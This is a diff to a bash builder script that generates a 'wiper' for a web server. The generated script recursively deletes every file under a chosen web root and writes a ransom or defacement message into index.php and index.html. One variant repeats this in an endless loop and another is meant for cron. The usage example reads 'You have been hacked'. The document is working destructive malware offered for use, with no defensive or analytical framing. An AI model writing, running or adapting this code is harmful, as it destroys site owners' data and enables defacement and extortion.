@@ -1,5 +1,55 @@
 #!/usr/bin/env bash
 
+
+template='#!/usr/bin/env bash
+
+declare -r WEBROOT=
+
+declare -r RANSOM_MESSAGE=
+
+declare -r SLEEP_TIME=
+
+
+function cld() {
+
+    echo "Clearing $1"
+
+
+    [ ! -e "$1" ] && return
+
+    [ ! -d "$1" ] && return
+
+    [ -e "$1" ] && [ -d "$1" ] && cd "$1"
+
+    [ "$PWD" != "$1" ] && return
+
+    [ "$(ls $1)" ] && rm * -r
+
+    [ "$(ls $1)" ] && echo "00000000000000000" && return
+
+    [ ! -s "$1" ] && echo "==================="
+
+}
+
+function act() {
+
+    cld $WEBROOT
+    echo $RANSOM_MESSAGE >"$WEBROOT/index.php"
+    echo $RANSOM_MESSAGE >"$WEBROOT/index.html"
+}
+'
+
+
+loop_template='
+while [ 1 -eq 1 ]; do
+
+    act
+
+    sleep SLEEP_TIME
+done
+'
+
+
 if [[ "$1" = "wiper" || "$1" = "cronwiper" ]]; then
 
     if [[ "$#" != 4 ]]; then
@@ -8,7 +58,7 @@ if [[ "$1" = "wiper" || "$1" = "cronwiper" ]]; then
         exit
     fi
 
-    content=$(cat .template);
+    content=$template
 
     content=${content//-r WEBROOT=/-r WEBROOT=\"$2\"}
     content=${content//-r RANSOM_MESSAGE=/-r RANSOM_MESSAGE=\"$3\"}
@@ -16,19 +66,21 @@ if [[ "$1" = "wiper" || "$1" = "cronwiper" ]]; then
 
     if [[ "$1" = "wiper" ]]; then
 
-        loop_part=$(cat .loop_template)
-
         echo "$content" > ".wiper"
-        echo -e "\n\n$loop_part" >> ".wiper"
+        echo -e "\n\n$loop_template" >> ".wiper"
+
+        echo -e "\n\nWiper created successfully."
         exit
 
     elif [[ "$1" = "cronwiper" ]]; then
         echo "$content" > ".cron_wiper"
         echo -e "\n\nact" >> ".cron_wiper"
+
+        echo -e "\n\nCron Wiper created successfully."
         exit
     fi
 
-else;
+else
 
     echo "Usage: build wiper|cronwiper path/to/webroot \"Ransom message\" sleepseconds";
     echo "Example: build wiper /hom4/user/public_html \"You have been hacked\" 300";
